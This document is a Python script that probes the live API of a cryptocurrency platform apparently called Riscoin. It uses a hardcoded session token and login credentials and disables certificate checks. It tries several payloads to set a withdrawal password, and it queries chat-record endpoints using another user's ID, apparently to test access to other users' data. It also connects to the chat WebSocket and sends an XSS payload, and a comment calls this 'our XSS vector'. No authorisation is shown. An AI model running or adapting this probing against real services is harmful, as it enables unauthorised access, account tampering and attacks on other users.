"""
Riscoin - Withdrawal password + new endpoint probing
"""
import requests, json
import urllib3
urllib3.disable_warnings()

BASE = "https://api.riscoima.com"
TOKEN = "c6b1n91oo800_1jn770f8e"
H = {
    "Origin": "https://riscoin.com",
    "Referer": "https://riscoin.com/h5/",
    "Content-Type": "application/json",
    "SET-LANGUAGE": "ENGLISH",
    "APP-LOGIN-TOKEN": TOKEN,
    "User-Agent": "Mozilla/5.0"
}

# Verify token first
print("=== Token check ===")
r = requests.post(f"{BASE}/api/app/user/get/info", json={}, headers=H, timeout=10, verify=False)
j = r.json()
if j.get("errCode") == 0:
    print(f"  Token valid. User: {j['data'].get('email')}")
else:
    print(f"  Token issue: {r.text[:200]}")
    print("  Re-logging in...")
    r = requests.post(f"{BASE}/api/app/user/login", 
                      json={"email": "gichgtrngwbvfaxhcv@vtmpj.net", "password": "password111"},
                      headers={k:v for k,v in H.items() if k != "APP-LOGIN-TOKEN"},
                      timeout=10, verify=False)
    j = r.json()
    TOKEN = j.get("data", "")
    H["APP-LOGIN-TOKEN"] = TOKEN
    print(f"  New token: {TOKEN}")

print("\n" + "=" * 70)
print("WITHDRAWAL PASSWORD STATUS")
print("=" * 70)

r = requests.post(f"{BASE}/api/app/user/withdrawal/password/status", json={}, headers=H, timeout=10, verify=False)
print(f"  Status: {r.text[:300]}")

# Try to set withdrawal password (this is interesting for our XSS vector)
print("\n--- Set withdrawal password ---")
payloads = [
    {"password": "123456", "emailCode": "123456"},
    {"withdrawalPassword": "123456"},
    {"newPassword": "123456"},
    {"pwd": "123456"},
]
for p in payloads:
    r = requests.post(f"{BASE}/api/app/user/set/withdrawal/password", json=p, headers=H, timeout=10, verify=False)
    j = r.json()
    err = j.get("errCode", "?")
    if err != 100003:
        print(f"  *** DIFFERENT errCode={err}: {list(p.keys())} -> {r.text[:200]}")
    else:
        print(f"  [100003] {list(p.keys())}")

print("\n" + "=" * 70)
print("CHAT WEBSOCKET EXPLORATION")
print("=" * 70)

# The chat uses WebSocket at wss://{domain}/ws/app/chat/
# Let's try to find the HTTP fallback or REST endpoints
chat_endpoints = [
    "/api/app/chat/record",
    "/api/app/chat/latest/record/id", 
    "/api/app/chat/send",
    "/api/app/chat/welcome_message",
]

# Try chat/record with userId
payloads = [
    {"userId": "439441312266874880", "pageNum": 0, "pageSize": 20},
    {"minId": 0, "pageNum": 0, "pageSize": 20},
    {"userId": "439441312266874880", "minId": 0},
    {"chatId": 0, "pageNum": 0, "pageSize": 20},
    {"chatId": "0"},
]
for p in payloads:
    r = requests.post(f"{BASE}/api/app/chat/record", json=p, headers=H, timeout=10, verify=False)
    j = r.json()
    err = j.get("errCode", "?")
    if err != 100003:
        print(f"  *** RECORD HIT errCode={err}: {json.dumps(p)} -> {r.text[:300]}")
    else:
        print(f"  [100003] chat/record: {json.dumps(p)}")

# Try chat/latest/record/id
payloads = [
    {"userId": "439441312266874880"},
    {"chatId": 0},
    {"id": 0},
    {},
]
for p in payloads:
    r = requests.post(f"{BASE}/api/app/chat/latest/record/id", json=p, headers=H, timeout=10, verify=False)
    j = r.json()
    err = j.get("errCode", "?")
    if err != 100003:
        print(f"  *** LATEST HIT errCode={err}: {json.dumps(p)} -> {r.text[:300]}")
    else:
        print(f"  [100003] chat/latest: {json.dumps(p)}")

print("\n" + "=" * 70)
print("WEBSOCKET CONNECTION TEST")
print("=" * 70)

try:
    import websocket
    ws_available = True
except ImportError:
    ws_available = False
    print("  websocket-client not installed. Install with: pip install websocket-client")

if ws_available:
    import ssl
    ws_url = f"wss://api.riscoima.com/ws/app/chat/?token={TOKEN}"
    print(f"  Connecting to: {ws_url}")
    try:
        ws = websocket.create_connection(
            ws_url,
            header=[
                "Origin: https://riscoin.com",
                f"Cookie: APP-LOGIN-TOKEN={TOKEN}",
            ],
            sslopt={"cert_reqs": ssl.CERT_NONE},
            timeout=10
        )
        print(f"  *** CONNECTED! ***")
        # Try to receive welcome message
        result = ws.recv()
        print(f"  Received: {result[:500]}")
        
        # Try sending a message
        ws.send(json.dumps({"content": "test_xss_<script>alert(1)</script>", "type": "text"}))
        result = ws.recv()
        print(f"  After send: {result[:500]}")
        ws.close()
    except Exception as e:
        print(f"  WS Error: {e}")

    # Also try quotes WebSocket
    ws_url2 = f"wss://api.riscoima.com/ws/sub-quotes"
    print(f"\n  Connecting to quotes WS: {ws_url2}")
    try:
        ws = websocket.create_connection(
            ws_url2,
            header=["Origin: https://riscoin.com"],
            sslopt={"cert_reqs": ssl.CERT_NONE},
            timeout=10
        )
        print(f"  *** CONNECTED to quotes! ***")
        result = ws.recv()
        print(f"  Received: {result[:300]}")
        ws.close()
    except Exception as e:
        print(f"  Quotes WS Error: {e}")

print("\n" + "=" * 70)
print("ADDITIONAL INTERESTING ENDPOINTS")
print("=" * 70)

# Try borrowing (might have different auth)
endpoints = [
    ("/api/app/borrow/info", {}, "Borrow info"),
    ("/api/app/borrow/product", {}, "Borrow product"),
    ("/api/app/borrow/myInfo", {}, "Borrow myInfo"),
    ("/api/app/rank/team", {}, "Team rank"),
    ("/api/app/share/my/award", {}, "My award"),
    ("/api/app/share/my/team", {}, "My team"),
    ("/api/app/prompt/list", {}, "Prompt list"),
    ("/api/app/user/certification/country", {}, "Cert countries"),
    ("/api/app/user/phone/country", {}, "Phone countries"),
]

for path, payload, label in endpoints:
    r = requests.post(f"{BASE}{path}", json=payload, headers=H, timeout=10, verify=False)
    j = r.json()
    err = j.get("errCode", "?")
    data = j.get("data", {})
    data_str = json.dumps(data)[:200] if data else "empty"
    if err == 0:
        print(f"  [OK] {label}: {data_str}")
    else:
        print(f"  [{err}] {label}")

print("\nDone.")
